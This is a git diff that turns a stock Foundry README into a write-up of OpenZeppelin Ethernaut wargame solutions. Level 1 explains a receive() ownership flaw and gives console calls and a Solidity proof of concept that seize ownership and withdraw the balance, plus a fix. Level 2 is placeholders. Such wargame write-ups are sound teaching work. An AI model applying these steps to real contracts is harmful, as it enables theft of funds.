@@ -1,66 +1,72 @@
-## Foundry
+# OpenZeppelin Ethernaut Solutions (Foundry)
 
-**Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.**
+This repository contains my exploit scripts, vulnerability analyses, and Proof of Concepts (PoCs) for the OpenZeppelin Ethernaut smart contract wargame, built using the Foundry framework.
 
-Foundry consists of:
+---
 
-- **Forge**: Ethereum testing framework (like Truffle, Hardhat and DappTools).
-- **Cast**: Swiss army knife for interacting with EVM smart contracts, sending transactions and getting chain data.
-- **Anvil**: Local Ethereum node, akin to Ganache, Hardhat Network.
-- **Chisel**: Fast, utilitarian, and verbose solidity REPL.
+## Level 1: Fallback
 
-## Documentation
+### Objective
+Claim ownership of the contract to drain its balance.
 
-https://book.getfoundry.sh/
+### Vulnerability Analysis
+The critical vulnerability exists within the `receive()` fallback function. The developer mistakenly placed the ownership transfer logic inside this function. Because `receive()` is automatically triggered when plain Ether is sent to the contract, anyone who meets the `require` conditions can hijack the contract.
 
-## Usage
+### Exploit Steps
 
-### Build
-
-```shell
-$ forge build
+**Method 1: Web3 Console (Browser)**
+1. **Bypass the requirement:** Send a small amount of ETH to pass the `contributions[msg.sender] > 0` check.
+```javascript
+await contract.contribute({ value: toWei("0.0001") });
 ```
 
-### Test
-
-```shell
-$ forge test
+2. **Trigger the fallback:** Send a blank transaction with ETH to trigger the `receive()` function and claim ownership.
+```javascript
+await contract.sendTransaction({ value: toWei("0.0001") });
 ```
 
-### Format
 
-```shell
-$ forge fmt
+3. **Drain the funds:** Execute the restricted withdraw function.
+```javascript
+await contract.withdraw();
 ```
 
-### Gas Snapshots
 
-```shell
-$ forge snapshot
+
+**Method 2: Foundry (PoC)**
+
+```solidity
+// Step 1: Contribute to bypass the require statement
+fallbackContract.contribute{value: 0.0001 ether}();
+
+// Step 2: Trigger receive() via a low-level call
+(bool success, ) = address(fallbackContract).call{value: 0.0001 ether}("");
+require(success, "Transaction failed");
+
+// Step 3: Drain the contract
+fallbackContract.withdraw();
 ```
 
-### Anvil
+### Mitigation (The Fix)
 
-```shell
-$ anvil
-```
+Do not use fallback or `receive()` functions to handle critical state changes like ownership transfers. Ownership changes should be handled by dedicated, explicit functions protected by proper access control modifiers (like OpenZeppelin's `Ownable` contract).
 
-### Deploy
+---
 
-```shell
-$ forge script script/Counter.s.sol:CounterScript --rpc-url <your_rpc_url> --private-key <your_private_key>
-```
+## Level 2: Fallout
 
-### Cast
+### Objective
 
-```shell
-$ cast <subcommand>
-```
+Claim ownership of the contract.
 
-### Help
+### Vulnerability Analysis
 
-```shell
-$ forge --help
-$ anvil --help
-$ cast --help
-```
+*(To be completed)*
+
+### Exploit Steps
+
+*(To be completed)*
+
+### Mitigation
+
+*(To be completed)*
